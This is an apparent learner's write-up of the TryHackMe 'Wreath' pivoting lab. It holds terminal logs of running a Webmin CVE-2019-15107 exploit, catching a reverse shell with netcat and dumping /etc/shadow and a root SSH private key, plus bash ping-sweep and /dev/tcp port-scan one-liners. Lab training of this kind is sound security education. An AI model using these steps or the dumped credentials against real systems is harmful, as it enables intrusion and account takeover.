# Wreath

![alt text](https://assets.tryhackme.com/room-banners/wreath_banner.png)

**Source:**  MuirlandOracle

***Description:***
  Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.
  
  ***Related Hosting Links***

- *TryHackMe.com*
  - Link: https://tryhackme.com/room/wreath
 
- **[Task 1]: Introduction**
   ![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/pic.png)

  Wreath is designed as a learning resource for beginners with a primary focus on:

    - Pivoting
    - Working with the Empire C2 (Command and Control) framework
    - Simple Anti-Virus evasion techniques

    The following topics will also be covered, albeit more briefly:

     - Code Analysis (Python and PHP)
     - Locating and modifying public exploits
     - Simple webapp enumeration and exploitation
     - Git Repository Analysis
     - Simple Windows Post-Exploitation techniques
     - CLI Firewall Administration (CentOS and Windows)
     - Cross-Compilation techniques
     - Coding wrapper programs
     - Simple exfiltration techniques
     - Formatting a pentest report

   These will be taught in the course of exploiting the Wreath network.

   This is designed as almost a sandbox environment to follow along with the teaching content; the focus will be on the above teaching points, rather than on initial access and    privilege escalation exploits (contrary to other boxes on the platform where the focus is on the challenge).
 
   ***Prerequisites:***
     This network is designed for beginners, but assumes basic competence in the Linux command line and fundamental hacking methodology. The ability to read and write a little      code will also be useful. Any other required knowledge will be linked throughout the tasks.
 
 
- ***[Task 2]: Accessing the Network***
 
    ***Controlling the Network:***

    The network has three states: Running, Stopped, and Resetting.

    The current state can be shown at the top right of the network box at the top of the page:
    ![alt text](https://assets.tryhackme.com/additional/wreath-network/fe129fa984de.png)

    - Running means that the network is fully operational and can be connected to at will
    - Stopped indicates that the network has gone to sleep. This happens when no one has pressed the "Extend" button within a set time limit so as to prevent the network from         being constantly running with no one using it. It can be restarted by pressing the "Start" button. This does not reset the network back to a clean copy, so anything stored       on the targets should still be there
    - Resetting indicates that the network is currently in the process of being wiped clean and resetting back to its default state. This can be used when something (or someone)       has happened to one of the targets rendering it broken

    The three buttons below the network map can be used to control this functionality:
 
    ![alt text](https://assets.tryhackme.com/additional/wreath-network/fbf6ced6514d.png)

    - The "Start" button restarts the network once stopped
    - The "Extend" button prevents the network from going to sleep. This button also contains a timer showing how long until the network shuts down
    - The "Reset" button initiates a full wipe of the network. This requires a percentage of users in the network to click the button, thus preventing a single person from             spamming resets 

- ***[Task 3]: Intro Backstory***

   Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real        reason he called:

   "So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"

   You take a moment to think about it, before deciding to accept the job -- it's for a friend after all.

   Turning down his offer of payment, you tell him:

- ***[Task 4]: Intro Brief***
    
    Thomas has sent over the following information about the network:

    There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way     in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if     you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and     can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same       difference.

   From this we can take away the following pieces of information:

  - There are three machines on the network
  - There is at least one public facing webserver
  - There is a self-hosted git server somewhere on the network
  - The git server is internal, so Thomas may have pushed sensitive information into it
  - There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows- 
  - By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
  - The (assumed) Windows PC cannot be accessed directly from the webserver

   Before we start, if you are using Kali, make sure that it's up to date:
     - sudo apt update && sudo apt upgrade


***[Task 5]: Webserver Enumeration***
   
   As with any attack, we first begin with the enumeration phase. Completing the Nmap room (if you haven't already) will help with this section.
   Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.
   Note: Here (and in general), it's a good idea to save your scan results to a file so you don't have to re-run the same scan twice.
  
   How many of the first 15000 ports are open on the target?
   - 4
   
   Perform a service scan on these open ports.
   What OS does Nmap think is running?
   - CentOS

   Okay, we know what we're dealing with.
   Open the IP in your browser -- what site does the server try to redirect you to?
    
   - https://thomaswreath.thm
   
   You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!

   Add it to your hosts file manually. This can be accomplished by editing the /etc/hosts file on Linux/MacOS, or C:\Windows\System32\drivers\etc\hosts on Windows, to include t    the IP address, followed by a tab, then the domain name. Note: this must be done as root/Administrator.

   It should look something like this when done, although the IP address and domain name will be different:

   10.10.10.10 example.thm
     
   - No answer needed
 
   Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the    internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.

   In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as            possible  and noting it down. You never know what could prove useful!

   Read through the text on the page. What is Thomas' mobile phone number?
     
   - +447821548812
  
  Let's have a look at the highest open port.
  Look back at your service scan results: what server version does Nmap detect as running here?
    
   - MiniServ 1.890 (Webmin httpd)

  Put your answer to the last question into Google.

  It appears that this service is vulnerable to an unauthenticated remote code execution exploit!

  What is the CVE number for this exploit?
    
   - CVE-2019-15107

    # NMAP:
    ┌──(root💀DESKTOP)-[~/Documents/Wreath]
    └─# nmap -vv -sV 10.200.106.200                 
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:41 IST
    NSE: Loaded 45 scripts for scanning.
    Initiating Ping Scan at 11:41
    Scanning 10.200.106.200 [4 ports]
    Completed Ping Scan at 11:41, 0.15s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 11:41
    Completed Parallel DNS resolution of 1 host. at 11:41, 1.04s elapsed
    Initiating SYN Stealth Scan at 11:41
    Scanning 10.200.106.200 [1000 ports]
    Discovered open port 80/tcp on 10.200.106.200
    Discovered open port 22/tcp on 10.200.106.200
    Discovered open port 443/tcp on 10.200.106.200
    Discovered open port 10000/tcp on 10.200.106.200
    Completed SYN Stealth Scan at 11:41, 9.50s elapsed (1000 total ports)
    Initiating Service scan at 11:41
    Scanning 4 services on 10.200.106.200
    Completed Service scan at 11:41, 26.06s elapsed (4 services on 1 host)
    NSE: Script scanning 10.200.106.200.
    NSE: Starting runlevel 1 (of 2) scan.
    Initiating NSE at 11:41
    Completed NSE at 11:42, 30.01s elapsed
    NSE: Starting runlevel 2 (of 2) scan.
    Initiating NSE at 11:42
    Completed NSE at 11:42, 2.02s elapsed
    Nmap scan report for 10.200.106.200
    Host is up, received echo-reply ttl 63 (0.16s latency).
    Scanned at 2021-03-25 11:41:04 IST for 69s
    Not shown: 995 filtered ports
    Reason: 980 no-responses and 15 admin-prohibiteds
    PORT      STATE  SERVICE    REASON         VERSION
    22/tcp    open   ssh        syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
    80/tcp    open   http       syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
    443/tcp   open   ssl/https? syn-ack ttl 63
    9090/tcp  closed zeus-admin reset ttl 63
    10000/tcp open   http       syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)

    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 69.27 seconds
           Raw packets sent: 1989 (87.492KB) | Rcvd: 22 (1.368KB)


    ┌──(root💀DESKTOP)-[~/Documents/Wreath]
    └─# cat /etc/hosts
    # This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
    # [network] 
    # generateHosts = false
    127.0.0.1       localhost
    127.0.1.1       DESKTOP-7K6I4IF.localdomain     DESKTOP-7K6I4IF
    127.0.0.1       localhost
    ::1     localhost

    # The following lines are desirable for IPv6 capable hosts
      ::1     ip6-localhost ip6-loopback
      fe00::0 ip6-localnet
      ff00::0 ip6-mcastprefix
      ff02::1 ip6-allnodes
      ff02::2 ip6-allrouters

      10.200.106.200  thomaswreath.thm

  
  
***[Task 6]: Webserver Exploitation***
      
   In the previous task we found a vulnerable service[1][2] running on the target which will give us the ability to execute commands on the target.

   The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for    these in an upcoming task!), however, in this instance, an exploit is provided here.

   Start by cloning the repository. This can be done with the following command:

    - git clone https://github.com/MuirlandOracle/CVE-2019-15107

   This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

    - cd CVE-2019-15107 && pip3 install -r requirements.txt

   If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
 
    - sudo apt install python3-pip

  The script should already be executable, but if not, add the executable bit (chmod +x ./CVE-2019-15107.py).

  Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in     this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to   read through scripts before running them).

  Once you're satisfied that the script will do what it says it will, run the exploit against the target!

    - ./CVE-2019-15107.py TARGET_IP

  - What is Webmin?
     
     Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.        Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely, the official website says. 

   Which user was the server running as?
 
   - root

   Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.

   Before we do though: nice though this pseudoshell is, it's not a full reverse shell.

   Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.

  - No answer needed

   Optional: Stabilise the reverse shell. There are several techniques for doing this detailed here.

   - No answer needed

   Now for a little post-exploitation!

  What is the root user's password hash?

  - $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

  You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of     the other services on the box.

  What is the full path to this file?

  - /root/.ssh/id_rsa
  
  Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to         obtain persistent access to the box.
   Run the exploit and obtain a pseudoshell on the target!


        ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath/CVE-2019-15107]
        └─# ./CVE-2019-15107.py 10.200.106.200

        __        __   _               _         ____   ____ _____ 
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle

        # PSEUDOSHELL:
        [*] Server is running in SSL mode. Switching to HTTPS
        [+] Connected to https://10.200.106.200:10000/ successfully.
        [+] Server version (1.890) should be vulnerable! 
        [+] Benign Payload executed!

        [+] The target is vulnerable and a pseudoshell has been obtained. 
        Type commands to have them executed on the target.
        [*] Type 'exit' to exit. 
        [*] Type 'shell' to obtain a full reverse shell (UNIX only).
        #id
        uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
        #shell
        sh-4.4# cat /etc/shadow
        cat /etc/shadow
        root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
        ┌──(root💀DESKTOP-7K6I4IF)-[~]
        └─# nc -lnvp 4444
         Listening on 0.0.0.0 4444
         Connection received on 10.200.106.200 51376
         sh: cannot set terminal process group (1781): Inappropriate ioctl for device
         sh: no job control in this shell

        sh-4.4# cat /root/.ssh/id_rsa
        cat /root/.ssh/id_rsa
                   -----BEGIN OPENSSH PRIVATE KEY-----
        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
                      -----END OPENSSH PRIVATE KEY-----


         ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
         └─# chmod 600 KEY_rsa 

         ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
         └─#ssh -i 'KEY_rsa' root@IP

         #Victim machine:
         [root@prod-serv tmp]#



***[Task 7]: Pivoting What is Pivoting?***

   Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration    testing, and is one of the three main teaching points for this room.

   Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and    use it to access other machines in the network that would not otherwise be accessible:

   ![alt text](https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png)

   In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public     server, we can then pivot to attack the remaining three targets.

   Note: This is an example diagram and is not representative of the Wreath Network.


***[Task 8]: Pivoting High-level Overview***

   The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being,    we'll be looking at more manual techniques for pivoting.

   There are two main methods encompassed in this area of pentesting:

   Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially      also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
   Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host
   A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple      different machines.

   Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

  Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It   would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box   at the top of the screen.

  As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux   webserver is absolutely ideal.

  The remaining tasks in this section will cover the following topics:

  Enumerating a network using native and statically compiled tools
  - Proxychains / FoxyProxy
  - SSH port forwarding and tunnelling (primarily Unix)
  - plink.exe (Windows)
  - socat (Windows and Unix)
  - chisel (Windows and Unix)
  - sshuttle (currently Unix only)
  This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.

  Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?


***[Task 9]: Pivoting Enumeration***

   As always, enumeration is the key to success. Information is power -- the more we know about our target, the more options we have available to us. As such, our first step        when attempting to pivot through a network is to get an idea of what's around us.

   There are five possible ways to enumerate a network through a compromised host:

   - Using material found on the machine. The hosts file or ARP cache, for example
   - Using pre-installed tools
   - Using statically compiled tools
   - Using scripting techniques
   - Using local tools through a proxy
   These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage    of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to    minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we'll cover below).

   Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. arp -a can be used to Windows or Linux to check    the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in /etc/hosts    on Linux, or C:\Windows\System32\drivers\etc\hosts on Windows. /etc/resolv.conf on Linux may also identify any local DNS servers, which may be misconfigured to allow            something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an        interface is with ipconfig /all. Linux has an equivalent command as an alternative to reading the resolv.conf file: nmcli dev show.

   If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it's possible to get static copies of many tools. These are      versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on any target,          assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in        various places on the internet. A good (if dated) resource for these can be found here. A more up-to-date (at the time of writing) version of Nmap for Linux specifically can    be found here. Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they    require different syntax, or don't work in quite the way that you've come to expect.

   Note: The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (.so files on Linux, or .dll      files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying    to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that    a dynamic binary would be unable to run.

   Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you        cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come      with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of    Nmap through a proxy specifically against the found ports.

   Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this      is not always the case (indeed, you'll find that Nmap is not installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into      whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x            network:

     for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

   This could be easily modified to search other network ranges -- including the Wreath network.

   The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to Radar filler image192.168.1.x as a      backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was            successful. Only successful responses are shown.

   The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a        simple network scanner in a language like C#, which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although a very simple    beta example can be found here).

   It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of    a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network      should be safe. It's worth keeping in mind, however.

   If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
   Port scanning in bash can be done (ideally) entirely natively:

     for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

   Bear in mind that this will take a very long time, however!

   There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!

   What is the absolute path to the file containing DNS entries on Linux?
    
   - /etc/resolv.conf

  What is the absolute path to the hosts file on Windows?

   - C:\Windows\System32\drivers\etc\hosts

  How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

   - for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done


***[Task 10]: Pivoting Proxychains & Foxyproxy***

   In this task we'll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we'll learn about in the upcoming        tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.

   Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network -- like a secret tunnel from a fantasy        story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber.

   Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.

   Proxychains

   Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a      connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only      when required.

  That said, let's take a look at the tool itself.

  Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat  through a proxy, you could use the   command:
        
      proxychains nc 172.16.0.10 23

  Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at           /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

  - The current directory (i.e. ./proxychains.conf)
  - ~/.proxychains/proxychains.conf
  - /etc/proxychains.conf
  This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: cp /etc/proxychains.conf ., then make any     changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a .proxychains directory     under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded       from here.

  Speaking of the proxychains.conf file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the     proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:


  ![alt text](https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png)

  Specifically, we are interested in the "ProxyList" section:

  [ProxyList]
  
  ![image](https://user-images.githubusercontent.com/68686150/114843643-a70c0d80-9df7-11eb-9247-70073d99d489.png)
  
  It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor     entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being       used for the proxies we'll be setting up in the following tasks.

  There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)
  
  If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of   the line before performing a scan through the proxy!

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)
  
  Other things to note when scanning through proxychains:

  You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packest (Ping requests) will also not work through the proxy, so use the  -Pn  switch to prevent Nmap from       trying it.
  It will be extremely slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy   of nmap to use the scripts library).

  #FoxyProxy

  Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available,         namely: FoxyProxy!

  People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be be used alongside the tools we'll be looking at in subsequent tasks   in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for Firefox and Chrome. There are two versions of FoxyProxy available:   Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish.

  After installing the extension in your browser of choice, click on it in your toolbar:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png)

  Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png)

  Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a     good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png)

  Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:

  ![alt text](https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png)

  Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have     internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your         general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than   interaction with the target network is advised.

  With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!


  What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

   - socks4 127.0.0.1 4242

  What command would you use to telnet through a proxy to 172.16.0.100:23?

   - proxychains telnet 172.16.0.100 23

  You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

   - FP













